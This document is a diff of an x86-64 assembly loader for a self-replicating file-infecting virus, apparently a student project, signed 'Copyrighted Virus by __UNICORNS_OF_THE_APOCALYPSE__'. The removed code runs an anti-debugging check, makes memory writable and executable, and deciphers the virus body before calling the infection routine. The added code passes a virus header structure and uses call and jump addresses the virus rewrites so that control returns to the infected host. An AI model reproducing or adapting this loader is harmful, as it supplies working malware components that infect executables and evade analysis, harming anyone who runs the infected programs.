@@ -1,26 +1,11 @@
-; **************************************************************************** ;
-;                                                                              ;
-;                                                         :::      ::::::::    ;
-;    loader.s                                           :+:      :+:    :+:    ;
-;                                                     +:+ +:+         +:+      ;
-;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
-;                                                 +#+#+#+#+#+   +#+            ;
-;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2020/01/04 19:52:14 by ichkamo          ###   ########.fr        ;
-;                                                                              ;
-; **************************************************************************** ;
-
-%define PROT_RWX		0x07
-
 section .text
 	global loader_entry
+	global call_virus
+	global jump_back_to_client
 	global loader_exit
 	global virus_header_struct
 
 extern virus
-extern wrap_decypher
-extern wrap_mprotect
-extern detect_spy
 
 ;----------------------------------; backup all swappable registers
 ;                                    (all but rax, rsp, rbp)
@@ -39,89 +24,53 @@ loader_entry:
 	push r14                   ; backup r14
 	push r15                   ; backup r15
 
-;----------------------------------; extract virus header on stack
-;  ----------------------------------------------------------------------------
-; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
-; | rdx  | r8          | r9          | r10         | r11          | r14        |
-; | seed | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
-; | seed | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
-;  ----------------------------------------------------------------------------
-	call mark_below
-mark_below:
-	pop rdx                    ; retrieve rip for virus_header_struct
-	add rdx, virus_header_struct - mark_below
-
-	mov r8, rdx
-	mov r9, rdx
-	mov r10, rdx
-	mov r11, rdx
-	mov r14, rdx
-	add r8, 16                 ; align vars to correct addresses
-	add r9, 24
-	add r10, 32
-	add r11, 40
-	add r14, 48
-	mov r8, [r8]               ; dereference vars
-	mov r9, [r9]
-	mov r10, [r10]
-	mov r11, [r11]
-	mov r14, [r14]
-
-	mov rcx, rdx               ; get loader_entry addr
-	sub rcx, virus_header_struct - loader_entry
-
-	mov r12, rcx
-	xchg r12, r8
-	sub r8, r12                ; r8 = rcx - r8
-	mov r12, rcx
-	xchg r12, r10
-	add r10, r12               ; r10 = rcx + r10
-	mov r12, rcx
-	xchg r12, r11
-	sub r11, r12               ; r11 = rcx - r11
-
-	push r14                   ; save virus size    [rsp + 48]
-	push rcx                   ; save loader_entry  [rsp + 40]
-	push r8                    ; save ptld addr     [rsp + 32]
-	push r9                    ; save ptld size     [rsp + 24]
-	push r10                   ; save virus addr    [rsp + 16]
-	push r11                   ; save entry addr    [rsp + 8]
-	push rdx                   ; save seed          [rsp]
-
-;----------------------------------; run anti debug
-	call detect_spy
-	test rax, rax
-	jnz return_to_client
-
-;----------------------------------; make ptld writable
-	mov rdi, [rsp + 32]        ; get ptld addr
-	mov rsi, [rsp + 24]        ; get ptld len
-	mov rdx, PROT_RWX
-	push rdi
-	push rsi
-	push rdx
-	call wrap_mprotect
-	add rsp, 24
-	test rax, rax
-	jnz return_to_client
-
-;----------------------------------; decypher virus
-	mov rdi, [rsp + 16]        ; get virus_addr
-	mov rsi, [rsp + 48]        ; get virus_size
-	push rdi
-	push rsi
-	call wrap_decypher
-	add rsp, 16
-
 ;----------------------------------; launch infection routines
-	call virus
 
-;----------------------------------; restore state, return to client code
-return_to_client:
-	mov rax, [rsp + 8]         ; get entry addr
-	add rsp, 56                ; restore stack as it was
+; allocate space for structure fields
+	sub rsp, end_virus_header - virus_header_struct
+
+; dist_client_loader
+	lea rcx, [rel virus_header_struct + 0x38]
+	mov rcx, [rcx]
+	mov [rsp + 0x38], rcx
+; dist_header_loader
+	lea rdx, [rel virus_header_struct + 0x30]
+	mov rdx, [rdx]
+	mov [rsp + 0x30], rdx
+; dist_vircall_loader
+	lea rbx, [rel virus_header_struct + 0x28]
+	mov rbx, [rbx]
+	mov [rsp + 0x28], rbx
+; dist_virus_loader
+	lea rsi, [rel virus_header_struct + 0x20]
+	mov rsi, [rsi]
+	mov [rsp + 0x20], rsi
+; loader_size
+	lea rdi, [rel virus_header_struct + 0x18]
+	mov rdi, [rdi]
+	mov [rsp + 0x18], rdi
+; loader_entry
+	lea r8, [rel loader_entry]
+	mov [rsp + 0x10], r8
+; virus_size
+	lea r9, [rel virus_header_struct + 0x8]
+	mov r9, [r9]
+	mov [rsp + 0x8], r9
+; seed
+	lea r10, [rel virus_header_struct]
+	mov r10, [r10]
+	mov [rsp], r10
+; pass structure address
+	mov rdi, rsp
+call_virus:
+	call virus                 ; address rewritten by virus
+
+; free structure fields space
+	add rsp, end_virus_header - virus_header_struct
 
 ;----------------------------------; restore registers
+
+return_to_client:
 	pop r15                    ; restore r15
 	pop r14                    ; restore r14
 	pop r13                    ; restore r13
@@ -135,14 +84,18 @@ return_to_client:
 	pop rbx                    ; restore rbx
 	pop rdx                    ; restore rdx
 	pop rcx                    ; restore rcx
-
-	push rax
-	ret
+jump_back_to_client:
+	jmp 0xffffffff             ; address rewritten by virus
 loader_exit:
 
 virus_header_struct:
-	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; virus seed[0]
-	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
-	db "rel ptld", "ptldsize", "relvirus"
-	db "relentry", "virusize"
+	db 0xD5, 0xEE, 0xF5, 0xE1, 0xAD, 0xDB, 0xDE, 0xFA ; virus seed (placeholder)
+	dq loader_entry                                   ; virus size (placeholder)
+	dq loader_entry                                   ; loader entry (placeholder)
+	dq loader_entry                                   ; loader_size
+	dq loader_entry                                   ; dist_virus_loader
+	dq loader_entry                                   ; dist_vircall_loader
+	dq loader_entry                                   ; dist_header_loader
+	dq loader_entry                                   ; dist_client_loader
+end_virus_header:
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
